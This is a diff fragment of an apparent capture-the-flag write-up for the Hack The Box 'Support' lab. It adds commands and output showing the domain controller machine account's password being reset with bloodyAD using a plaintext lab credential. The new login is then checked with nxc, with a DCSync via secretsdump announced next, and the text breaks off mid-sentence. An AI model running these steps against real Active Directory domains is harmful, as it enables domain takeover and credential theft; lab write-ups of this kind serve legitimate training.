@@ -263,5 +263,17 @@ Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its a
 Now ill give myself GenericAll (FullControl)
 
 ```python
+bloodyAD --host dc.support.htb -d support.htb -u support -p 'Ironside47pleasure40Watchful' set password 'dc$' 'Password123!'
 
+[+] Password changed successfully!
 ```
+
+Now the password is changed for the DC machine account, i can just run a DCsync using secretsdump
+
+```python
+nxc smb dc.support.htb -u 'dc$' -p 'Password123!'                                                                                   
+SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.230.181  445    DC               [+] support.htb\dc$:Password123!
+```
+
+As see
